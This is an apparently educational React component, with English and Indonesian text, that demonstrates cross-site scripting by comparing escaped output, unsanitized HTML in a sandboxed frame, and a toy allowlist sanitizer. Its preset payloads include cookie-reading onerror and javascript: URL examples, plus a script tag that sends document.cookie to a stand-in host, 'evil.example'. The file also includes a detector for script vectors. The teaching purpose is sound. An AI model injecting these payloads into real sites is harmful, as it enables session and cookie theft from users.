import { useMemo, useState } from 'react'
import { Note } from './common'
import { useLang, type Lang } from '../i18n/lang'

const T = {
  en: {
    handler: 'event handler', withContent: '(with content)', unwrapped: '(unwrapped, text kept)', on: 'on',
    harmless: 'harmless formatting', payload: 'Payload:', comment: 'User comment (from the database, i.e. attacker-controlled)',
    def: '1. React default', safe: 'safe', unsanitized: '(unsanitized)', dangerous: 'dangerous', escapes: 'React escapes strings: tags show up as text, nothing is parsed as HTML.',
    frame: 'Unsanitized HTML preview (sandboxed, scripts disabled)', wouldRun: "Shown in a script-disabled sandbox here. In a real app this code WOULD run with your users' cookies and session.",
    noVectors: 'No script vectors detected.', sanitized: '3. Sanitized (allowlist)', removed: 'Removed:', nothing: 'nothing',
    nDanger: (n: number) => `This payload contains **${n}** script vector${n > 1 ? 's' : ''}. JSX \`{comment}\` is safe by default; \`dangerouslySetInnerHTML\` hands the string straight to the browser's HTML parser. The allowlist keeps only \`b i em strong a p br ul li code\`, strips every \`on*\` attribute and allows \`href\` only for http/https. This toy sanitizer is for learning: in production use a battle-tested library such as **DOMPurify**.`,
    nSafe: 'Harmless formatting survives the allowlist intact, so users still get bold, links and lists. Prefer rendering plain text or Markdown; reach for `dangerouslySetInnerHTML` only with a real sanitizer like **DOMPurify** (and ideally a Content-Security-Policy as a second line of defence).',
  },
  id: {
    handler: 'event handler', withContent: '(beserta isinya)', unwrapped: '(dibuka, teksnya dipertahankan)', on: 'pada',
    harmless: 'format yang aman', payload: 'Payload:', comment: 'Komentar pengguna (dari database, artinya bisa dikendalikan penyerang)',
    def: '1. Bawaan React', safe: 'aman', unsanitized: '(tanpa sanitasi)', dangerous: 'berbahaya', escapes: 'React meng-escape string: tag tampil sebagai teks, tidak ada yang di-parse sebagai HTML.',
    frame: 'Pratinjau HTML tanpa sanitasi (di sandbox, script dimatikan)', wouldRun: 'Di sini ditampilkan dalam sandbox yang mematikan script. Di aplikasi sungguhan, kode ini AKAN berjalan dengan cookie dan session pengguna kamu.',
    noVectors: 'Tidak ada vektor script yang terdeteksi.', sanitized: '3. Disanitasi (allowlist)', removed: 'Dihapus:', nothing: 'tidak ada',
    nDanger: (n: number) => `Payload ini berisi **${n}** vektor script. JSX \`{comment}\` aman secara default; \`dangerouslySetInnerHTML\` menyerahkan string-nya langsung ke parser HTML browser. Allowlist hanya mempertahankan \`b i em strong a p br ul li code\`, membuang semua atribut \`on*\`, dan hanya mengizinkan \`href\` untuk http/https. Sanitizer mainan ini hanya untuk belajar: di production, pakai library yang sudah teruji seperti **DOMPurify**.`,
    nSafe: 'Format yang aman tetap utuh setelah melewati allowlist, jadi pengguna tetap bisa memakai teks tebal, link, dan list. Lebih baik render teks biasa atau Markdown; pakai `dangerouslySetInnerHTML` hanya bersama sanitizer sungguhan seperti **DOMPurify** (dan idealnya Content-Security-Policy sebagai lapis pertahanan kedua).',
  },
} as const

const PRESETS: { label: string; html: string }[] = [
  { label: 'img onerror', html: `Nice post! <img src=x onerror="alert('stolen: '+document.cookie)"> <b>bold</b> <a href="javascript:alert(1)">click</a>` },
  { label: 'script tag', html: `Great article <script>fetch('https://evil.example/?c='+document.cookie)</script><i>really</i>` },
  { label: 'javascript: URL', html: `See <a href="  JaVaScript:alert(document.domain)">my profile</a> and <a href="https://react.dev">docs</a>` },
  { label: 'svg onload', html: `<svg onload="alert('xss')"><circle r="10"></circle></svg> Cute icon!` },
  { label: 'harmless formatting', html: `<p>I <strong>love</strong> this. <em>Tips:</em></p><ul><li>use <code>key</code></li><li>read <a href="https://react.dev">react.dev</a></li></ul>` },
]

const ALLOWED = new Set(['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li', 'code'])
const DROP_WITH_CONTENT = new Set(['script', 'style', 'iframe', 'object', 'embed', 'svg', 'math', 'template', 'noscript'])
// Strip whitespace/control chars browsers ignore inside URL schemes ("java\tscript:").
const isJsUrl = (v: string) => /^javascript:/i.test(v.replace(/[\u0000- ]/g, ''))

function parse(html: string) {
  // DOMParser documents have no browsing context: nothing loads or runs.
  return new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html')
}

function detect(html: string, lang: Lang) {
  const t = T[lang]
  const found: string[] = []
  for (const el of parse(html).body.querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase()
    if (tag === 'script') found.push(`<script> tag: ${(el.textContent ?? '').slice(0, 50)}`)
    for (const a of el.attributes) {
      if (a.name.startsWith('on')) found.push(`<${tag} ${a.name}="${a.value.slice(0, 50)}"> ${t.handler}`)
      if (['href', 'src', 'xlink:href', 'action', 'formaction'].includes(a.name) && isJsUrl(a.value)) found.push(`<${tag} ${a.name}="${a.value.trim().slice(0, 50)}"> javascript: URL`)
    }
  }
  return found
}

function sanitize(html: string, lang: Lang) {
  const t = T[lang]
  const doc = parse(html)
  const removed: string[] = []
  const walk = (node: Element) => {
    for (const child of [...node.children]) {
      const tag = child.tagName.toLowerCase()
      if (DROP_WITH_CONTENT.has(tag)) {
        removed.push(`<${tag}> ${t.withContent}`)
        child.remove()
        continue
      }
      walk(child)
      if (!ALLOWED.has(tag)) {
        removed.push(`<${tag}> ${t.unwrapped}`)
        child.replaceWith(...child.childNodes)
        continue
      }
      for (const a of [...child.attributes]) {
        const okHref = tag === 'a' && a.name === 'href' && /^https?:\/\//i.test(a.value.trim())
        if (!okHref) {
          removed.push(`${a.name}="${a.value.slice(0, 40)}" ${t.on} <${tag}>`)
          child.removeAttribute(a.name)
        }
      }
      if (tag === 'a' && child.hasAttribute('href')) {
        child.setAttribute('rel', 'noopener noreferrer')
        child.setAttribute('target', '_blank')
      }
    }
  }
  walk(doc.body)
  return { html: doc.body.innerHTML, removed }
}

const paneTitle = { margin: '0 0 6px', fontSize: '0.8rem' } as const

export default function Xss() {
  const [comment, setComment] = useState(PRESETS[0]!.html)
  const lang = useLang()
  const t = T[lang]
  const dangers = useMemo(() => detect(comment, lang), [comment, lang])
  const clean = useMemo(() => sanitize(comment, lang), [comment, lang])

  return (
    <div>
      <div className="viz-controls">
        <span className="subtle">{t.payload}</span>
        {PRESETS.map(p => (
          <button key={p.label} className="btn sm" onClick={() => setComment(p.html)} aria-pressed={comment === p.html}>
            {p.label === 'harmless formatting' ? t.harmless : p.label}
          </button>
        ))}
      </div>
      <div className="viz-stage">
        <label htmlFor="xss-comment" className="subtle" style={{ fontSize: '0.8rem' }}>
          {t.comment}
        </label>
        <textarea
          id="xss-comment"
          value={comment}
          onChange={e => setComment(e.target.value)}
          rows={3}
          spellCheck={false}
          style={{ width: '100%', boxSizing: 'border-box', fontFamily: 'var(--mono)', fontSize: '0.8rem', marginTop: 4 }}
        />
        <div className="grid cols-3" style={{ gap: 10, marginTop: 10 }}>
          <div className="lane" style={{ minWidth: 0 }}>
            <h4 style={paneTitle}>
              {t.def} <code>{'{comment}'}</code> <span className="pill ok">{t.safe}</span>
            </h4>
            <div style={{ fontSize: '0.85rem', overflowWrap: 'anywhere' }}>{comment}</div>
            <p className="subtle" style={{ fontSize: '0.75rem' }}>{t.escapes}</p>
          </div>

          <div className="lane" style={{ minWidth: 0, borderColor: dangers.length ? 'var(--bad)' : undefined }}>
            <h4 style={paneTitle}>
              2. <code>dangerouslySetInnerHTML</code> {t.unsanitized} {dangers.length > 0 && <span className="pill" style={{ background: 'var(--bad-soft)', color: 'var(--bad)' }}>{t.dangerous}</span>}
            </h4>
            {/* Empty sandbox: no scripts, no same-origin access. The demo itself never runs the payload. */}
            <iframe sandbox="" srcDoc={comment} title={t.frame} style={{ width: '100%', height: 90, border: '1px dashed var(--border)', borderRadius: 6, background: 'var(--bg-sunk)' }} />
            <p style={{ fontSize: '0.75rem', color: 'var(--bad)', fontWeight: 600, margin: '6px 0' }}>
              {t.wouldRun}
            </p>
            {dangers.length === 0 ? (
              <span className="subtle" style={{ fontSize: '0.75rem' }}>{t.noVectors}</span>
            ) : (
              <ul style={{ margin: 0, paddingLeft: 16, fontSize: '0.75rem', fontFamily: 'var(--mono)', color: 'var(--bad)', overflowWrap: 'anywhere' }}>
                {dangers.map((d, i) => (
                  <li key={i}>{d}</li>
                ))}
              </ul>
            )}
          </div>

          <div className="lane" style={{ minWidth: 0 }}>
            <h4 style={paneTitle}>
              {t.sanitized} <span className="pill ok">{t.safe}</span>
            </h4>
            <div style={{ fontSize: '0.85rem', overflowWrap: 'anywhere' }} dangerouslySetInnerHTML={{ __html: clean.html }} />
            <div className="subtle" style={{ fontSize: '0.75rem', marginTop: 6 }}>{t.removed}</div>
            {clean.removed.length === 0 ? (
              <span className="subtle" style={{ fontSize: '0.75rem' }}>{t.nothing}</span>
            ) : (
              <ul style={{ margin: 0, paddingLeft: 16, fontSize: '0.75rem', fontFamily: 'var(--mono)', color: 'var(--warn)', overflowWrap: 'anywhere' }}>
                {clean.removed.map((r, i) => (
                  <li key={i}>{r}</li>
                ))}
              </ul>
            )}
            <div className="subtle" style={{ fontSize: '0.7rem', marginTop: 6, fontFamily: 'var(--mono)', overflowWrap: 'anywhere' }}>{clean.html}</div>
          </div>
        </div>
      </div>
      <Note>
        {dangers.length
          ? t.nDanger(dangers.length)
          : t.nSafe}
      </Note>
    </div>
  )
}
